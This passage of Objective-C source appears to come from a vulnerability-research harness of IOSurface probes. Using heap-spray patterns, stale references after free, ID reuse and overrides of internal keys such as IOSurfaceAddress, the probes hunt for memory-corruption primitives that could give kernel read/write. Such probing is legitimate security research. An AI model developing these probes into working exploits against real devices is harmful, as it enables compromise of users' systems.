                return;
            }

            // Step 1: Create 30 victim surfaces with 128-byte properties
            if (!isr_stopped()) {
                log(@"PROPSPRAY: Step 1 — Create 30 victim surfaces with 128-byte properties (0xAA)");
                NSDictionary *params = isr_default_surface_params(32, 32);

                for (int i = 0; i < PS_VICTIM_COUNT && !isr_stopped(); i++) {
                    victims[i] = sym.create((__bridge CFDictionaryRef)params);
                    if (!victims[i]) continue;
                    victimIDs[i] = sym.getID(victims[i]);

                    NSMutableData *blob = [NSMutableData dataWithLength:128];
                    memset(blob.mutableBytes, 0xAA, 128);
                    NSString *key = [NSString stringWithFormat:@"VICTIM_%d", i];
                    setValue(victims[i], (__bridge CFStringRef)key, (__bridge CFTypeRef)blob);

                    staleRefs[i] = sym.lookup(victimIDs[i]);
                }
                log([NSString stringWithFormat:@"PROPSPRAY: Created %d victims with stale refs", PS_VICTIM_COUNT]);

            // Step 2: Destroy all victim surfaces
            if (!isr_stopped()) {
                log(@"PROPSPRAY: Step 2 — Destroy all victim surfaces");
                for (int i = 0; i < PS_VICTIM_COUNT; i++) {
                    if (victims[i]) {
                        CFRelease(victims[i]);
                        victims[i] = NULL;
                    }
                }

            // Step 3: Create 30 spray surfaces with 128-byte properties (0xBB)
            if (!isr_stopped()) {
                log(@"PROPSPRAY: Step 3 — Create 30 spray surfaces with 128-byte properties (0xBB)");
                NSDictionary *params2 = isr_default_surface_params(32, 32);

                for (int i = 0; i < PS_SPRAY_COUNT && !isr_stopped(); i++) {
                    sprays[i] = sym.create((__bridge CFDictionaryRef)params2);
                    if (!sprays[i]) continue;

                    NSMutableData *blob = [NSMutableData dataWithLength:128];
                    memset(blob.mutableBytes, 0xBB, 128);
                    NSString *key = [NSString stringWithFormat:@"SPRAY_%d", i];
                    setValue(sprays[i], (__bridge CFStringRef)key, (__bridge CFTypeRef)blob);
                }
                log([NSString stringWithFormat:@"PROPSPRAY: Created %d spray surfaces", PS_SPRAY_COUNT]);

            // Step 4: Read stale references — check for cross-contamination
            if (!isr_stopped()) {
                log(@"PROPSPRAY: Step 4 — Read stale victim refs for cross-contamination");

                for (int i = 0; i < PS_VICTIM_COUNT && !isr_stopped(); i++) {
                    if (!staleRefs[i]) continue;

                    IOSurfaceRef relookup = sym.lookup(victimIDs[i]);
                    IOSurfaceRef readRef = relookup ? relookup : staleRefs[i];

                    NSString *victimKey = [NSString stringWithFormat:@"VICTIM_%d", i];
                    CFTypeRef val = copyValue(readRef, (__bridge CFStringRef)victimKey);
                    if (val) {
                        staleReads++;
                        if (CFGetTypeID(val) == CFDataGetTypeID()) {
                            NSData *data = (__bridge NSData *)val;
                            const uint8_t *bytes = data.bytes;
                            BOOL hasBB = NO;
                            for (NSUInteger b = 0; b < data.length; b++) {
                                if (bytes[b] == 0xBB) { hasBB = YES; break; }
                            }
                            if (hasBB) {
                                crossContam++;
                                anomalies += 5;
                                log([NSString stringWithFormat:@"PROPSPRAY: *** CROSS-CONTAM victim %d has 0xBB spray data! ***", i]);
                            }
                        }
                        CFRelease(val);
                    }

                    for (int s = 0; s < PS_SPRAY_COUNT; s++) {
                        NSString *sprayKey = [NSString stringWithFormat:@"SPRAY_%d", s];
                        CFTypeRef sval = copyValue(readRef, (__bridge CFStringRef)sprayKey);
                        if (sval) {
                            crossContam++;
                            anomalies += 3;
                            log([NSString stringWithFormat:@"PROPSPRAY: *** victim %d returned SPRAY_%d property! ***", i, s]);
                            CFRelease(sval);
                            break;
                        }
                    }

                    if (relookup) CFRelease(relookup);
                }
                log([NSString stringWithFormat:@"PROPSPRAY: Stale reads: %d, cross-contaminations: %d", staleReads, crossContam]);

            // Step 5: Property remove/realloc test
            if (!isr_stopped()) {
                log(@"PROPSPRAY: Step 5 — Property remove/realloc test on live surfaces");
                NSDictionary *params3 = isr_default_surface_params(64, 64);
                IOSurfaceRef surfA = sym.create((__bridge CFDictionaryRef)params3);
                IOSurfaceRef surfB = sym.create((__bridge CFDictionaryRef)params3);

                if (surfA && surfB) {
                    NSMutableData *blobA = [NSMutableData dataWithLength:256];
                    memset(blobA.mutableBytes, 0xCC, 256);
                    setValue(surfA, CFSTR("REALLOC_TEST"), (__bridge CFTypeRef)blobA);

                    removeValue(surfA, CFSTR("REALLOC_TEST"));

                    NSMutableData *blobB = [NSMutableData dataWithLength:256];
                    memset(blobB.mutableBytes, 0xDD, 256);
                    setValue(surfB, CFSTR("REALLOC_TEST2"), (__bridge CFTypeRef)blobB);

                    CFTypeRef readA = copyValue(surfA, CFSTR("REALLOC_TEST"));
                    if (readA) {
                        propRemoveHits++;
                        anomalies += 3;
                        log(@"PROPSPRAY: *** Removed property REALLOC_TEST still readable on surfA! ***");
                        CFRelease(readA);
                    } else {
                        log(@"PROPSPRAY: Removed property correctly gone from surfA");
                    }

                    CFTypeRef readA2 = copyValue(surfA, CFSTR("REALLOC_TEST2"));
                    if (readA2) {
                        propRemoveHits++;
                        anomalies += 5;
                        log(@"PROPSPRAY: *** surfA returns surfB's REALLOC_TEST2 — property confusion! ***");
                        CFRelease(readA2);
                    }
                }

                if (surfA) CFRelease(surfA);
                if (surfB) CFRelease(surfB);
                log([NSString stringWithFormat:@"PROPSPRAY: Property remove hits: %d", propRemoveHits]);

            } // end step 5
            } // end step 4
            } // end step 3
            } // end step 2
            } // end step 1

            for (int i = 0; i < PS_VICTIM_COUNT; i++) {
                if (staleRefs[i]) CFRelease(staleRefs[i]);
            }
            for (int i = 0; i < PS_SPRAY_COUNT; i++) {
                if (sprays[i]) CFRelease(sprays[i]);
            }
            #undef PS_VICTIM_COUNT
            #undef PS_SPRAY_COUNT

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"PROPSPRAY: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);

            NSString *verdict;
            if (anomalies >= 15) verdict = @"CRITICAL — cross-surface property confusion confirmed";
            else if (anomalies >= 8) verdict = @"HIGH — stale references return spray data";
            else if (anomalies >= 3) verdict = @"MEDIUM — partial stale access with property overlap";
            else if (anomalies >= 1) verdict = @"LOW — stale reads but no cross-contamination";
            else verdict = @"LOW — no cross-contamination detected";
            log([NSString stringWithFormat:@"PROPSPRAY: VERDICT: %@", verdict]);

            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"verdict": verdict,
                @"elapsed": @(elapsed),
                @"staleReads": @(staleReads),
                @"crossContam": @(crossContam),
                @"propRemoveHits": @(propRemoveHits)
            };
            isr_checkpoint(@"ISR-PropSpray-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

#pragma mark - Probe 66: IOSurface ID Reuse Confusion

void iosurface_research_id_reuse(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"IDREUSE: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"IDREUSE: Starting ID reuse confusion — destroy and recreate until same ID, check property confusion");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;

            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");

            IOSurfaceID targetID = 0;
            IOSurfaceRef staleRef = NULL;
            IOSurfaceRef newSurfWithSameID = NULL;
            int idReuseFound = 0;
            int propConfusion = 0;
            int stalePropsReadable = 0;
            int attempts = 0;

            if (!setValue || !copyValue) {
                log(@"IDREUSE: Missing property APIs");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            // Step 1: Create original surface with 10 tagged properties
            if (!isr_stopped()) {
                log(@"IDREUSE: Step 1 — Create original surface with 10 tagged properties");
                NSDictionary *params = isr_default_surface_params(32, 32);
                IOSurfaceRef original = sym.create((__bridge CFDictionaryRef)params);

                if (original) {
                    targetID = sym.getID(original);

                    for (int i = 0; i < 10; i++) {
                        NSString *key = [NSString stringWithFormat:@"ORIG_PROP_%d", i];
                        uint32_t tag = 0xAAAA0000 | i;
                        NSMutableData *blob = [NSMutableData dataWithLength:64];
                        uint32_t *words = (uint32_t *)blob.mutableBytes;
                        for (int w = 0; w < 16; w++) words[w] = tag;
                        setValue(original, (__bridge CFStringRef)key, (__bridge CFTypeRef)blob);
                    }

                    staleRef = sym.lookup(targetID);
                    log([NSString stringWithFormat:@"IDREUSE: Original surface ID=%u, 10 props set, stale ref obtained", (unsigned)targetID]);

                    CFRelease(original);
                    original = NULL;
                    log(@"IDREUSE: Original surface destroyed");
                } else {
                    log(@"IDREUSE: Failed to create original surface");
                }

            // Step 2: Create surfaces until we get the same ID
            if (!isr_stopped() && targetID > 0) {
                log(@"IDREUSE: Step 2 — Creating surfaces until ID reuse");
                NSDictionary *params2 = isr_default_surface_params(32, 32);
                IOSurfaceRef tempSurfs[500];
                int tempCount = 0;

                for (int i = 0; i < 500 && !isr_stopped(); i++) {
                    IOSurfaceRef s = sym.create((__bridge CFDictionaryRef)params2);
                    if (!s) continue;
                    attempts++;
                    IOSurfaceID sid = sym.getID(s);

                    if (sid == targetID) {
                        newSurfWithSameID = s;
                        idReuseFound = 1;
                        anomalies += 3;
                        log([NSString stringWithFormat:@"IDREUSE: *** ID REUSE after %d attempts! ID=%u ***", attempts, (unsigned)sid]);
                        break;
                    }
                    tempSurfs[tempCount++] = s;
                }

                for (int i = 0; i < tempCount; i++) {
                    CFRelease(tempSurfs[i]);
                }

                if (!idReuseFound) {
                    log([NSString stringWithFormat:@"IDREUSE: No ID reuse after %d attempts", attempts]);
                }

            // Step 3: If ID reuse, set different properties on new surface
            if (!isr_stopped() && newSurfWithSameID) {
                log(@"IDREUSE: Step 3 — Setting new properties on reused-ID surface");

                for (int i = 0; i < 5; i++) {
                    NSString *key = [NSString stringWithFormat:@"NEW_PROP_%d", i];
                    uint32_t tag = 0xBBBB0000 | i;
                    NSMutableData *blob = [NSMutableData dataWithLength:64];
                    uint32_t *words = (uint32_t *)blob.mutableBytes;
                    for (int w = 0; w < 16; w++) words[w] = tag;
                    setValue(newSurfWithSameID, (__bridge CFStringRef)key, (__bridge CFTypeRef)blob);
                }
                log(@"IDREUSE: 5 new properties set on reused surface");

            // Step 4: Read via stale ref — check for property confusion
            if (!isr_stopped()) {
                log(@"IDREUSE: Step 4 — Read stale ref properties, check for confusion");

                for (int i = 0; i < 10 && !isr_stopped(); i++) {
                    NSString *key = [NSString stringWithFormat:@"ORIG_PROP_%d", i];
                    CFTypeRef val = copyValue(staleRef, (__bridge CFStringRef)key);
                    if (val) {
                        stalePropsReadable++;
                        if (CFGetTypeID(val) == CFDataGetTypeID()) {
                            NSData *data = (__bridge NSData *)val;
                            const uint32_t *words = (const uint32_t *)data.bytes;
                            if (data.length >= 4) {
                                uint32_t expected = 0xAAAA0000 | i;
                                if (words[0] != expected) {
                                    propConfusion++;
                                    anomalies += 3;
                                    log([NSString stringWithFormat:@"IDREUSE: *** PROP CONFUSION ORIG_%d expected 0x%08X got 0x%08X ***",
                                         i, expected, words[0]]);
                                }
                            }
                        }
                        CFRelease(val);
                    }
                }

                for (int i = 0; i < 5 && !isr_stopped(); i++) {
                    NSString *key = [NSString stringWithFormat:@"NEW_PROP_%d", i];
                    CFTypeRef val = copyValue(staleRef, (__bridge CFStringRef)key);
                    if (val) {
                        anomalies += 2;
                        propConfusion++;
                        log([NSString stringWithFormat:@"IDREUSE: *** Stale ref reads NEW_PROP_%d from reused surface! ***", i]);
                        CFRelease(val);
                    }
                }

                IOSurfaceRef relookup = sym.lookup(targetID);
                if (relookup) {
                    for (int i = 0; i < 10 && !isr_stopped(); i++) {
                        NSString *key = [NSString stringWithFormat:@"ORIG_PROP_%d", i];
                        CFTypeRef val = copyValue(relookup, (__bridge CFStringRef)key);
                        if (val) {
                            anomalies++;
                            log([NSString stringWithFormat:@"IDREUSE: *** Relookup returns OLD property ORIG_%d ***", i]);
                            CFRelease(val);
                        }
                    }
                    CFRelease(relookup);
                }

                log([NSString stringWithFormat:@"IDREUSE: Stale props readable: %d/10, confusion: %d", stalePropsReadable, propConfusion]);

            } // end step 4
            } // end step 3
            } // end step 2
            } // end step 1

            if (staleRef) CFRelease(staleRef);
            if (newSurfWithSameID) CFRelease(newSurfWithSameID);

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"IDREUSE: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);

            NSString *verdict;
            if (propConfusion >= 5) verdict = @"CRITICAL — full property confusion via ID reuse, stale ref reads new surface data";
            else if (propConfusion >= 2) verdict = @"HIGH — property confusion confirmed, partial cross-read";
            else if (idReuseFound) verdict = @"MEDIUM — ID reuse achieved but properties isolated";
            else if (stalePropsReadable > 0) verdict = @"LOW — stale ref readable but no ID reuse";
            else verdict = @"LOW — no ID reuse or stale access";
            log([NSString stringWithFormat:@"IDREUSE: VERDICT: %@", verdict]);

            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"verdict": verdict,
                @"elapsed": @(elapsed),
                @"idReuseFound": @(idReuseFound),
                @"attempts": @(attempts),
                @"propConfusion": @(propConfusion),
                @"stalePropsReadable": @(stalePropsReadable)
            };
            isr_checkpoint(@"ISR-IDReuse-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

#pragma mark - Probe 67: Key Enum

void iosurface_research_key_enum(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"KEYENUM: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"KEYENUM: Starting internal key enumeration");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            unsigned anomalies = 0;

            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");

            int readableCount = 0;
            int addressLikeCount = 0;
            NSMutableArray *readableKeys = [NSMutableArray array];

            NSDictionary *params = isr_default_surface_params(64, 64);
            IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)params);

            if (!surf || !copyValue) {
                log(@"KEYENUM: Failed to create surface or load CopyValue");
                if (surf) CFRelease(surf);
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            sym.lock(surf, 0, NULL);
            sym.unlock(surf, 0, NULL);

            NSArray *keys = @[
                @"IOSurfaceAddress", @"IOSurfaceAllocSize", @"IOSurfaceBytesPerElement",
                @"IOSurfaceBytesPerRow", @"IOSurfaceWidth", @"IOSurfaceHeight",
                @"IOSurfacePixelFormat", @"IOSurfaceOffset", @"IOSurfacePlaneInfo",
                @"IOSurfacePlaneSize", @"IOSurfacePlaneBytesPerRow", @"IOSurfacePlaneOffset",
                @"IOSurfacePlaneBase", @"IOSurfaceCacheMode", @"IOSurfaceIsGlobal",
                @"IOSurfaceClientAddress", @"IOSurfaceMapOffset", @"IOSurfaceMipmapLevel",
                @"IOSurfaceElementWidth", @"IOSurfaceElementHeight", @"IOSurfaceAllocSizeOrig",
                @"IOSurfacePurgeWhenNotInUse", @"IOSurfacePlaneWidth", @"IOSurfacePlaneHeight",
                @"IOSurfaceICCProfile", @"IOSurfaceColorSpace", @"IOSurfaceSubsampling"
            ];

            if (!isr_stopped()) {
                log(@"KEYENUM: Step 1 — Enumerate all internal keys");

                for (NSString *key in keys) {
                    if (isr_stopped()) break;

                    CFTypeRef val = copyValue(surf, (__bridge CFStringRef)key);
                    if (val) {
                        readableCount++;
                        [readableKeys addObject:key];
                        CFTypeID tid = CFGetTypeID(val);

                        if (tid == CFNumberGetTypeID()) {
                            int64_t num = 0;
                            CFNumberGetValue((CFNumberRef)val, kCFNumberSInt64Type, &num);
                            NSString *flag = @"";
                            if (num > 0x100000000ULL) {
                                flag = @" [ADDRESS-LIKE]";
                                addressLikeCount++;
                                anomalies++;
                            }
                            log([NSString stringWithFormat:@"KEYENUM: ✓ %@ = %lld (0x%llX) [Number]%@",
                                 key, (long long)num, (unsigned long long)num, flag]);
                        } else if (tid == CFDataGetTypeID()) {
                            NSData *data = (__bridge NSData *)val;
                            NSUInteger len = data.length;
                            const uint8_t *bytes = data.bytes;
                            NSMutableString *hex = [NSMutableString string];
                            for (NSUInteger i = 0; i < MIN(len, 16); i++) {
                                [hex appendFormat:@"%02X", bytes[i]];
                            }
                            if (len > 16) [hex appendString:@"..."];
                            log([NSString stringWithFormat:@"KEYENUM: ✓ %@ = <%lu bytes> %@ [Data]",
                                 key, (unsigned long)len, hex]);
                        } else if (tid == CFStringGetTypeID()) {
                            log([NSString stringWithFormat:@"KEYENUM: ✓ %@ = %@ [String]",
                                 key, (__bridge NSString *)val]);
                        } else if (tid == CFBooleanGetTypeID()) {
                            BOOL b = CFBooleanGetValue((CFBooleanRef)val);
                            log([NSString stringWithFormat:@"KEYENUM: ✓ %@ = %@ [Bool]",
                                 key, b ? @"YES" : @"NO"]);
                        } else if (tid == CFDictionaryGetTypeID()) {
                            CFIndex count = CFDictionaryGetCount((CFDictionaryRef)val);
                            log([NSString stringWithFormat:@"KEYENUM: ✓ %@ = {dict %ld keys} [Dict]",
                                 key, (long)count]);
                        } else if (tid == CFArrayGetTypeID()) {
                            CFIndex count = CFArrayGetCount((CFArrayRef)val);
                            log([NSString stringWithFormat:@"KEYENUM: ✓ %@ = [array %ld items] [Array]",
                                 key, (long)count]);
                        } else {
                            log([NSString stringWithFormat:@"KEYENUM: ✓ %@ = <CFTypeID=%lu> [Unknown]",
                                 key, (unsigned long)tid]);
                        }
                        CFRelease(val);
                    } else {
                        log([NSString stringWithFormat:@"KEYENUM: ✗ %@ = nil", key]);
                    }
                }

                log([NSString stringWithFormat:@"KEYENUM: Readable keys: %d/%lu, address-like: %d",
                     readableCount, (unsigned long)keys.count, addressLikeCount]);

            } // end step 1

            CFRelease(surf);

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"KEYENUM: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);

            NSString *verdict;
            if (addressLikeCount >= 3) verdict = @"HIGH — multiple address-like values exposed via API";
            else if (addressLikeCount >= 1) verdict = @"MEDIUM — address-like values found in keys";
            else if (readableCount >= 15) verdict = @"MEDIUM — extensive internal state readable";
            else if (readableCount >= 5) verdict = @"LOW — some internal keys readable";
            else verdict = @"LOW — minimal key access";
            log([NSString stringWithFormat:@"KEYENUM: VERDICT: %@", verdict]);

            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"verdict": verdict,
                @"elapsed": @(elapsed),
                @"readableKeys": @(readableCount),
                @"addressLikeKeys": @(addressLikeCount)
            };
            isr_checkpoint(@"ISR-KeyEnum-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

#pragma mark - Probe 68: Key Override

void iosurface_research_key_override(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"KEYOVERRIDE: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"KEYOVERRIDE: Starting internal key override test");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            unsigned anomalies = 0;

            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");

            int behaviorChanges = 0;
            int baseChanges = 0;
            int sizeChanges = 0;
            NSMutableArray *effectiveKeys = [NSMutableArray array];

            NSDictionary *params = isr_default_surface_params(64, 64);
            IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)params);

            if (!surf || !setValue || !copyValue) {
                log(@"KEYOVERRIDE: Failed to create surface or load functions");
                if (surf) CFRelease(surf);
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            sym.lock(surf, 0, NULL);
            void *origBase = sym.getBase(surf);
            size_t origWidth = sym.getWidth(surf);
            size_t origHeight = sym.getHeight(surf);
            size_t origBpr = sym.getBytesPerRow(surf);
            size_t origAlloc = sym.getAllocSize(surf);
            sym.unlock(surf, 0, NULL);

            log([NSString stringWithFormat:@"KEYOVERRIDE: Original — base=%p w=%zu h=%zu bpr=%zu alloc=%zu",
                 origBase, origWidth, origHeight, origBpr, origAlloc]);

            NSArray *testKeys = @[
                @"IOSurfaceAllocSize", @"IOSurfaceBytesPerRow", @"IOSurfaceWidth",
                @"IOSurfaceHeight", @"IOSurfacePixelFormat", @"IOSurfaceOffset",
                @"IOSurfaceBytesPerElement", @"IOSurfaceCacheMode",
                @"IOSurfaceAddress", @"IOSurfaceClientAddress", @"IOSurfaceMapOffset",
                @"IOSurfaceElementWidth", @"IOSurfaceElementHeight",
                @"IOSurfaceAllocSizeOrig", @"IOSurfaceIsGlobal",
                @"IOSurfacePurgeWhenNotInUse", @"IOSurfaceSubsampling"
            ];

            if (!isr_stopped()) {
                log(@"KEYOVERRIDE: Step 1 — Override each key and check behavior changes");

                for (NSString *key in testKeys) {
                    if (isr_stopped()) break;

                    CFTypeRef origVal = copyValue(surf, (__bridge CFStringRef)key);

                    int64_t overrideVal = 99999;
                    if ([key containsString:@"Address"] || [key containsString:@"MapOffset"]) {
                        overrideVal = 0x41414141000ULL;
                    } else if ([key containsString:@"Size"] || [key containsString:@"Alloc"]) {
                        overrideVal = 1048576;
                    } else if ([key containsString:@"Width"] || [key containsString:@"Height"]) {
                        overrideVal = 4096;
                    } else if ([key containsString:@"BytesPerRow"]) {
                        overrideVal = 65536;
                    }

                    setValue(surf, (__bridge CFStringRef)key, (__bridge CFTypeRef)@(overrideVal));

                    sym.lock(surf, 0, NULL);
                    void *newBase = sym.getBase(surf);
                    size_t newWidth = sym.getWidth(surf);
                    size_t newHeight = sym.getHeight(surf);
                    size_t newBpr = sym.getBytesPerRow(surf);
                    size_t newAlloc = sym.getAllocSize(surf);
                    sym.unlock(surf, 0, NULL);

                    BOOL changed = NO;
                    NSMutableString *changes = [NSMutableString string];

                    if (newBase != origBase) {
                        [changes appendFormat:@"BASE %p→%p ", origBase, newBase];
                        baseChanges++;
                        changed = YES;
                    }
                    if (newWidth != origWidth) {
                        [changes appendFormat:@"W %zu→%zu ", origWidth, newWidth];
                        changed = YES;
                    }
                    if (newHeight != origHeight) {
                        [changes appendFormat:@"H %zu→%zu ", origHeight, newHeight];
                        changed = YES;
                    }
                    if (newBpr != origBpr) {
                        [changes appendFormat:@"BPR %zu→%zu ", origBpr, newBpr];
                        changed = YES;
                    }
                    if (newAlloc != origAlloc) {
                        [changes appendFormat:@"ALLOC %zu→%zu ", origAlloc, newAlloc];
                        sizeChanges++;
                        changed = YES;
                    }

                    if (changed) {
                        behaviorChanges++;
                        anomalies++;
                        [effectiveKeys addObject:key];
                        NSString *severity = (baseChanges > 0) ? @"*** CRITICAL" : @"*** HIGH";
                        log([NSString stringWithFormat:@"KEYOVERRIDE: %@ %@ → %@ ***",
                             severity, key, changes]);
                    } else {
                        log([NSString stringWithFormat:@"KEYOVERRIDE: %@ → no observable change", key]);
                    }

                    if (origVal) {
                        setValue(surf, (__bridge CFStringRef)key, origVal);
                        CFRelease(origVal);
                    } else {
                        setValue(surf, (__bridge CFStringRef)key, (__bridge CFTypeRef)@(0));
                    }
                }

                log([NSString stringWithFormat:@"KEYOVERRIDE: Behavior changes: %d, base changes: %d, size changes: %d",
                     behaviorChanges, baseChanges, sizeChanges]);

            } // end step 1

            CFRelease(surf);

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"KEYOVERRIDE: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);

            NSString *verdict;
            if (baseChanges > 0) verdict = @"CRITICAL — base address changed via key override! Potential kernel R/W";
            else if (sizeChanges > 0) verdict = @"HIGH — allocation size changed, potential OOB primitive";
            else if (behaviorChanges >= 3) verdict = @"HIGH — multiple observable behavior changes";
            else if (behaviorChanges >= 1) verdict = @"MEDIUM — some key overrides affect behavior";
            else verdict = @"LOW — no observable behavior changes from key overrides";
            log([NSString stringWithFormat:@"KEYOVERRIDE: VERDICT: %@", verdict]);

            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"verdict": verdict,
                @"elapsed": @(elapsed),
                @"behaviorChanges": @(behaviorChanges),
                @"baseChanges": @(baseChanges),
                @"sizeChanges": @(sizeChanges),
                @"effectiveKeys": effectiveKeys
            };
            isr_checkpoint(@"ISR-KeyOverride-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

#pragma mark - Probe 69: Address Redirect

void iosurface_research_addr_redirect(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"ADDREDIR: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"ADDREDIR: Starting address redirect via internal key manipulation");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            unsigned anomalies = 0;

            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");

            int redirectSuccess = 0;
            int oobSuccess = 0;
            int crossRead = 0;

            NSDictionary *paramsA = isr_default_surface_params(64, 64);
            NSDictionary *paramsB = isr_default_surface_params(128, 128);
            IOSurfaceRef surfA = sym.create((__bridge CFDictionaryRef)paramsA);
            IOSurfaceRef surfB = sym.create((__bridge CFDictionaryRef)paramsB);

            if (!surfA || !surfB || !setValue || !copyValue) {
                log(@"ADDREDIR: Failed to create surfaces or load functions");
                if (surfA) CFRelease(surfA);
                if (surfB) CFRelease(surfB);
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            sym.lock(surfA, 0, NULL);
            sym.lock(surfB, 0, NULL);
            void *baseA = sym.getBase(surfA);
            void *baseB = sym.getBase(surfB);
            size_t allocA = sym.getAllocSize(surfA);
            size_t allocB = sym.getAllocSize(surfB);

            memset(baseA, 0xAA, allocA);
            memset(baseB, 0xBB, allocB);
            sym.unlock(surfA, 0, NULL);
            sym.unlock(surfB, 0, NULL);

            log([NSString stringWithFormat:@"ADDREDIR: Surface A base=%p alloc=%zu (filled 0xAA)", baseA, allocA]);
            log([NSString stringWithFormat:@"ADDREDIR: Surface B base=%p alloc=%zu (filled 0xBB)", baseB, allocB]);

            // Step 1: Try address keys to redirect A → B
            if (!isr_stopped()) {
                log(@"ADDREDIR: Step 1 — Try address key overrides to redirect surface A mapping");

                NSArray *addrKeys = @[@"IOSurfaceAddress", @"IOSurfaceClientAddress", @"IOSurfaceMapOffset"];

                for (NSString *key in addrKeys) {
                    if (isr_stopped()) break;

                    CFTypeRef origVal = copyValue(surfA, (__bridge CFStringRef)key);
                    uint64_t targetAddr = (uint64_t)(uintptr_t)baseB;

                    setValue(surfA, (__bridge CFStringRef)key, (__bridge CFTypeRef)@(targetAddr));
                    log([NSString stringWithFormat:@"ADDREDIR: Set %@ = 0x%llX (surfB base)", key, targetAddr]);

                    sym.lock(surfA, 0, NULL);
                    void *newBaseA = sym.getBase(surfA);

                    uint8_t readBuf[16];
                    memset(readBuf, 0, sizeof(readBuf));
                    vm_size_t outSize = 0;
                    kern_return_t kr = vm_read_overwrite(mach_task_self(),
                                                         (vm_address_t)newBaseA, sizeof(readBuf),
                                                         (vm_address_t)readBuf, &outSize);

                    BOOL hasRedirect = NO;
                    if (kr == KERN_SUCCESS && outSize > 0) {
                        int bbCount = 0;
                        for (int i = 0; i < (int)outSize; i++) {
                            if (readBuf[i] == 0xBB) bbCount++;
                        }
                        if (bbCount > 8) {
                            hasRedirect = YES;
                            redirectSuccess++;
                            anomalies += 10;
                            log([NSString stringWithFormat:@"ADDREDIR: *** CRITICAL — %@ redirected A to B! Read 0xBB x%d ***",
                                 key, bbCount]);
                        } else if (newBaseA != baseA) {
                            anomalies++;
                            log([NSString stringWithFormat:@"ADDREDIR: *** HIGH — %@ changed base %p→%p but data not B's ***",
                                 key, baseA, newBaseA]);
                        } else {
                            log([NSString stringWithFormat:@"ADDREDIR: %@ — base unchanged, read[0]=0x%02X", key, readBuf[0]]);
                        }
                    } else {
